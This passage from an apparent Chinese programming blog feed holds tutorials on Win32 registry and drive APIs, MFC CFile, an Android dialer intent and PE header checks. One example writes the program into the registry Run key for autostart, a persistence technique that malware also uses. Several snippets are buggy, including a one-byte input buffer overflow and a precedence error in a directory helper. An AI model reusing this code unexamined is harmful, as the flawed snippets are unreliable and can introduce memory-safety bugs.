<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegSetValueEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,           <span class="comment">// handle to key to set value for</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpValueName, <span class="comment">// name of the value to set</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD Reserved,      <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwType,        <span class="comment">// flag for value type</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST BYTE *lpData,  <span class="comment">// address of value data</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD cbData         <span class="comment">// size of value data</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>dwType</code>这个参数是用来设置一些flag的，具体的可以是下面几个值（比较常用的我复制的是）：</li>
</ol>
<ul>
<li>REG_BINARY</li>
<li>REG_DWORD</li>
<li>REG_EXPAND_SZ</li>
<li>REG_MULTI_SZ</li>
<li>REG_SZ</li>
</ul>
<p>其他参数都是比较好理解的。</p>
<p>读取键值：<code>RegQueryValueEx</code>，函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegQueryValueEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,           <span class="comment">// handle to key to query</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpValueName,  <span class="comment">// address of name of value to query</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,  <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,      <span class="comment">// address of buffer for value type</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE lpData,       <span class="comment">// address of data buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData     <span class="comment">// address of data buffer size</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个函数基本上没啥太大的难度，但是这种函数又是比较典型的二次函数（我自己起的名字），意思就是说这种函数我们在调用的过程中我们需要调用两次。<br>主要的特别之处在于我们的最后一个参数的长度是不确定的，所以我们在第一次调用这个函数的时候可以读取数据类型，如果类型符合我们就读取实际数据。<br>主要的特点：</p>
<ol>
<li><code>lpData</code>这个参数设置为NULL的时候我们的<code>lpcbData</code>这个参数返回我们的真是数据长度</li>
<li>上述两个参数如果都是NULL的话呢，我们的类型将会返回给我们</li>
</ol>
<p>删除键值：<code>RegDeleteValue</code>，函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegDeleteValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,            <span class="comment">// handle to key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpValueName   <span class="comment">// address of value name</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个函数也是比较的简单，参数也是很明显的。</p>
<h1 id="注册表实例-开机自动启动"><a href="#注册表实例-开机自动启动" class="headerlink" title="注册表实例-开机自动启动"></a>注册表实例-开机自动启动</h1><p>其实这类的东西做时间长了发现其实就是一个思路，就是写写注册表，基本上靠平常日无聊时候看看网站收集到的。<br><em>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</em>这个注册表里面的东西就是开机自动启动项目，但是前提你的这个值类型为：REG_SZ。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hRoot = HKEY_LOCAL_MACHINE; </span><br><span class="line">	<span class="keyword">char</span> *szSubKey = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;<span class="comment">//不要忘记转义了哦</span></span><br><span class="line">	HKEY hKey;</span><br><span class="line">	<span class="comment">//打开指定的子键</span></span><br><span class="line">	DWORD dwDis = REG_OPENED_EXISTING_KEY;<span class="comment">//没有的话呢也不创建</span></span><br><span class="line">	<span class="keyword">if</span>(RegCreateKeyEx(hRoot,szSubKey,<span class="number">0</span>,<span class="literal">NULL</span>,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,<span class="literal">NULL</span>,&amp;hKey,&amp;dwDis) != ERROR_SUCCESS)<span class="comment">//重启不丢失，然后多要点权限 ，不成功就返回 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">char</span> szModleFile[MAX_PATH];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>,szModleFile,MAX_PATH);<span class="comment">//获取一下当前的文件名称</span></span><br><span class="line">	<span class="keyword">if</span>(RegSetValueEx(hKey,<span class="string">"Ceshi"</span>,<span class="number">0</span>,REG_SZ,(BYTE*)szModleFile,<span class="built_in">strlen</span>(szModleFile)) == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"success!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RegCloseKey(hKey);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有一点需要注意的是，我们在Win8或Win10之类的高版本平台上运行，我们需要给他管理员哦，否则也是不行的！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动器卷标-文件夹操作</title>
    <url>/2020/01/28/%E9%A9%B1%E5%8A%A8%E5%99%A8%E5%8D%B7%E6%A0%87-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="驱动器与文件夹"><a href="#驱动器与文件夹" class="headerlink" title="驱动器与文件夹"></a>驱动器与文件夹</h1><p>这两个东西在我们的日常操作电脑的过程中，经常用到，就是用来存储硬盘上的文件的。</p>
<h2 id="卷标操作"><a href="#卷标操作" class="headerlink" title="卷标操作"></a>卷标操作</h2><p>由于不是很常用这些函数，我就贴一下函数定义就好了。<br><code>SetVolumeLabel</code>设置卷标名称。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetVolumeLabel</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,  <span class="comment">// pointer to name of root directory for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="comment">// volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpVolumeName   <span class="comment">// name for the volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数如果为NULL的话呢是操作当前的一个卷标，第二个参数就是卷标的名称，<strong>如果设置为NULL则是删除卷标</strong>。<br><code>GetVolumeInformation</code>获取卷标信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVolumeInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,        <span class="comment">// address of root directory of the </span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// file system</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpVolumeNameBuffer,     <span class="comment">// address of name of the volume</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nVolumeNameSize,         <span class="comment">// length of lpVolumeNameBuffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpVolumeSerialNumber,  <span class="comment">// address of volume serial number</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpMaximumComponentLength,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// address of system's maximum </span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="comment">// filename length</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpFileSystemFlags,     <span class="comment">// address of file system flags</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpFileSystemNameBuffer, <span class="comment">// address of name of file system</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nFileSystemNameSize      <span class="comment">// length of lpFileSystemNameBuffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>逻辑驱动器的序列号是在格式化驱动器的时候，操作系统随机分配的一个GUID（全局标识符）。</p>
<h2 id="检测逻辑驱动器"><a href="#检测逻辑驱动器" class="headerlink" title="检测逻辑驱动器"></a>检测逻辑驱动器</h2><p><code>DWORD GetLogicalDrives(VOID)</code>逻辑驱动器可用情况<br>这个函数没有参数，返回值是一个位掩码：<br><strong>如果函数成功，则返回一个位掩码，表示当前可用的磁盘驱动器。位位置0(最小有效位)是驱动器A，位位置1是驱动器B，位位置2是驱动器C，依此类推。</strong><br><code>GetLogicalDriveStrings</code>获取存在的卷标：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDriveStrings</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nBufferLength,  <span class="comment">// size of buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpBuffer       <span class="comment">// pointer to buffer for drive strings</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个就是位了我们的方便进行设计的，缓冲区的内容格式就是：<br><code>c:\&lt;null&gt;d:\&lt;null&gt;&lt;null&gt;</code><br><code>GetDriveType</code>获取驱动器的类型<br>就是判断驱动器是个什么盘符，比如说网络的，U盘，硬盘之类的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetDriveType</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName   <span class="comment">// pointer to root path</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值有如下几个：</p>
<ul>
<li>DRIVE_UNKNOWN     The drive type cannot be determined. </li>
<li>DRIVE_NO_ROOT_DIR The     root directory does not exist. </li>
<li>DRIVE_REMOVABLE     The disk can be removed from the drive. </li>
<li>DRIVE_FIXED     The disk cannot be removed from the drive. </li>
<li>DRIVE_REMOTE     The drive is a remote (network) drive. </li>
<li>DRIVE_CDROM     The drive is a CD-ROM drive. </li>
<li>DRIVE_RAMDISK     The drive is a RAM disk. </li>
</ul>
<p><code>GetDiskFreeSpace</code>获取磁盘空间剩余的内容<br>有时候我们确实有这种需求，需要我们的磁盘剩余空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetDiskFreeSpace</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpRootPathName,    <span class="comment">// pointer to root path（要检测的磁盘）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpSectorsPerCluster,  <span class="comment">// pointer to sectors per cluster（返回簇的扇区数）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpBytesPerSector,  <span class="comment">// pointer to bytes per sector（每扇区的字节数）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfFreeClusters,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// pointer to number of free clusters（用于返回未使用的簇的数量）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpTotalNumberOfClusters </span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// pointer to total number of clusters（驱动器簇的总量）</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>总容量的公式：簇总数 X 每簇扇区数 X 每扇区的字节数<br>剩余容量的计算公式： 未使用的簇 X 每簇扇区数 X 每扇区的字节数</p>
<h2 id="格式化驱动器"><a href="#格式化驱动器" class="headerlink" title="格式化驱动器"></a>格式化驱动器</h2><p><code>SHFormatDriver</code>这个是个外壳函数，就是意思是打开一个对话框，让用户进行选择行操作，这个函数使用的情况很少，所以不介绍了。但值得一说的是需要：<code>#include &lt;shlobj.h&gt;</code>和导入shell32.dll。</p>
<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><p><code>CreateDirectory</code>创建一个文件夹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpPathName,                         <span class="comment">// pointer to directory path string</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes  <span class="comment">// pointer to security descriptor</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>不能进行递归创建，我们自己写一个就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CStudy_HistoryDlg::CreateDir(LPCTSTR lpszDir)</span><br><span class="line">&#123;</span><br><span class="line">	CString strDir = lpszDir;</span><br><span class="line">	<span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(pos = strDir.Find(<span class="string">"\\"</span>,pos+<span class="number">1</span>) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateDirectory(strDir.Left(pos),<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CreateDirectory(strDir,<span class="literal">NULL</span>);;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>RemoveDirectory</code>删除目录<br>这个只能删除空目录，无法递归删除，递归删除的话呢使用我们之前写好的那个文件删除的函数就可以了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>MFC-CFile</title>
    <url>/2020/01/28/MFC-CFile/</url>
    <content><![CDATA[<h2 id="CFile"><a href="#CFile" class="headerlink" title="CFile"></a>CFile</h2><p>MFC是出了名的方便，因为他和java一样封装了许许多多的类，方便了我们在程序编写的时候方便的进行调用。<br>这篇博客记录一下CFile类的一些使用方法，环境就是MFC的一个类库支持。<br>这个类库支持异常的一些处理：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFile file;</span><br><span class="line">CFileException e;</span><br><span class="line"><span class="keyword">if</span> (file.Open(<span class="string">"File.txt"</span>,CFile::modeReadWrite,&amp;e))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	e.ReportError();<span class="comment">//打印一下异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然也是可以这个样子写的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFile file;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	file.Open(<span class="string">"File.txt"</span>,CFile::modeReadWrite);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (CFileException* e)</span><br><span class="line">&#123;</span><br><span class="line">	e-&gt;ReportError();<span class="comment">//打印一下异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很是方便，而且是通过信息框的方式进行打印。<br>方便的不仅如此，比如说我们没有这个txt的情况下进行写入，正常情况下我们需要判断是否有这个txt，然后没有的话呢就生成然后在写入，但是CFile这个类的话呢不需要，我们只需要写就好了，例如下面：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">CFile <span class="title">file</span><span class="params">(<span class="string">"ReadMe.txt"</span>,CFile::modeCreate | CFile::modeReadWrite | CFile::modeNoTruncate)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	这个位置操作文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">file.Close();<span class="comment">//方便其他程序可以读取</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，我们指定了一个<code>CFile::modeNoTruncate</code>参数就是说如果我们的txt存在了，我们并不是截断他到0，而是继续写入，这个属性基本上用到Create基本上必须要用到！<br>如何进行读写呢，看下面示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">1024</span>*<span class="number">4</span>];</span><br><span class="line"><span class="function">CFile <span class="title">file</span><span class="params">(<span class="string">"ReadMe.txt"</span>,CFile::modeCreate | CFile::modeReadWrite | CFile::modeNoTruncate)</span></span>;</span><br><span class="line">DWORD dwSize = file.GetLength();</span><br><span class="line">CString Context;</span><br><span class="line"><span class="keyword">while</span>(dwSize)</span><br><span class="line">&#123;</span><br><span class="line">	UINT real = file.Read(buffer,<span class="keyword">sizeof</span>(buffer));</span><br><span class="line">	Context += buffer;</span><br><span class="line">	dwSize -= real;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(Context);</span><br><span class="line">file.Close();<span class="comment">//方便其他程序可以读取</span></span><br></pre></td></tr></table></figure>
<p>可以看到很是方便！</p>
]]></content>
      <categories>
        <category>MFC</category>
      </categories>
      <tags>
        <tag>MFC</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent实现拨号</title>
    <url>/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="实例：手机拨号"><a href="#实例：手机拨号" class="headerlink" title="实例：手机拨号"></a>实例：手机拨号</h2><p>这个东西其实就是打开一个Activity然后在打开的过程中传输我们我的手机号，思路就是获取Edittext输入的值，然后在我们是用隐式intent的传输我们的手机号给指定的Activity就可以进行实现手机拨号的功能，具体的实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Button btn01;</span><br><span class="line">	<span class="keyword">private</span> EditText edt01;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">		edt01 = (EditText)findViewById(R.id.editText1);</span><br><span class="line">		btn01 = (Button)findViewById(R.id.button1);</span><br><span class="line">		btn01.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				String phoneNumber = edt01.getText().toString();</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">				intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">				intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br><span class="line">				startActivity(intent);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意手机的是拨号的Intent-filter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br></pre></td></tr></table></figure>
<p>tel协议后面要跟上我们的手机号。<br>但是这个时候并不能正常运行，因为我们没有这个权限，拨号算是手机的底层功能，所以需要特殊的一个权限，这个就是在安装的时候我们点击安装程序自动提示给我们是否允许这个功能（安装的时候都见到过），所以我们在AndroidManifest.xml中进行一个权限的请求：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就是请求拨号权限，这个之后我们的程序就能够正常的拨号了！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件判定</title>
    <url>/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/</url>
    <content><![CDATA[<h2 id="PE文件有效性验证"><a href="#PE文件有效性验证" class="headerlink" title="PE文件有效性验证"></a>PE文件有效性验证</h2><p>之前自己写了一个自己读的PE区段的小程序（当时是模仿CE写的一个内存搜索工具），当时写的是真的按照微软给的格式（什么NT头什么DOS头乱七八糟的）一个字节一个字节找的，但是后来发现居然有一个结构体居然可以直接拿来用，哎，失算失算~</p>
<h2 id="IMAGE-DOS-HEADER和IMAGE-NT-HEADERS"><a href="#IMAGE-DOS-HEADER和IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_DOS_HEADER和IMAGE_NT_HEADERS"></a><code>IMAGE_DOS_HEADER</code>和<code>IMAGE_NT_HEADERS</code></h2><p>由于我的MSDN是2001年的，所以这个我是从IDE找到的，没有注释，但是大体的结构还是能看懂的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span></span><br><span class="line">      WORD e_magic;</span><br><span class="line">      WORD e_cblp;</span><br><span class="line">      WORD e_cp;</span><br><span class="line">      WORD e_crlc;</span><br><span class="line">      WORD e_cparhdr;</span><br><span class="line">      WORD e_minalloc;</span><br><span class="line">      WORD e_maxalloc;</span><br><span class="line">      WORD e_ss;</span><br><span class="line">      WORD e_sp;</span><br><span class="line">      WORD e_csum;</span><br><span class="line">      WORD e_ip;</span><br><span class="line">      WORD e_cs;</span><br><span class="line">      WORD e_lfarlc;</span><br><span class="line">      WORD e_ovno;</span><br><span class="line">      WORD e_res[<span class="number">4</span>];</span><br><span class="line">      WORD e_oemid;</span><br><span class="line">      WORD e_oeminfo;</span><br><span class="line">      WORD e_res2[<span class="number">10</span>];</span><br><span class="line">      LONG e_lfanew;</span><br><span class="line">    &#125; IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">      DWORD Signature;</span><br><span class="line">      IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">      IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    &#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p>这个就是微软定义的一个结构，我们用这个结构就能够轻松的读取了，思路就是先打开文件，后读取文件，判断DOS头，判断NT头。<br>实现的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IMAGE_DOS_HEADER dosHeader;</span><br><span class="line">	IMAGE_NT_HEADERS ntHeaders;</span><br><span class="line">	<span class="keyword">char</span> * text = <span class="keyword">new</span> <span class="keyword">char</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Please Input File Address:"</span>; </span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;text;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;text&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	HANDLE hFile = CreateFile(text,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);<span class="comment">//常规的打开一个文件 </span></span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"error file!"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	ReadFile(hFile,&amp;dosHeader,<span class="keyword">sizeof</span>(dosHeader),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(dosHeader))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dosHeader.e_magic == IMAGE_DOS_SIGNATURE)<span class="comment">//判断是不是MZ，就是你常见的那个</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(SetFilePointer(hFile,dosHeader.e_lfanew,<span class="literal">NULL</span>,FILE_BEGIN) != <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ReadFile(hFile,&amp;ntHeaders,<span class="keyword">sizeof</span>(ntHeaders),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(ntHeaders))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(ntHeaders.Signature == IMAGE_NT_SIGNATURE)<span class="comment">//判断是不是那个PE</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"Congrate!This is PE File!"</span>;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sorry,This is not!"</span> ;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是比较简单的，用这两个结构体，那么具体如何读取区段之后再说！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Anr异常</title>
    <url>/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<h2 id="ANR异常"><a href="#ANR异常" class="headerlink" title="ANR异常"></a>ANR异常</h2><p>其实就是主线程卡死，然后无法响应，大于6秒，会出现如下的一个错误报告：<br><img src="img1.jpg" alt="ANR异常"><br>这个时候就是说我们卡死了，代码里如这个样子写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Thread.sleep(<span class="number">60000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决办法也很简单，就是放在子线程中写耗时的操作！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android横竖屏设置</title>
    <url>/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/</url>
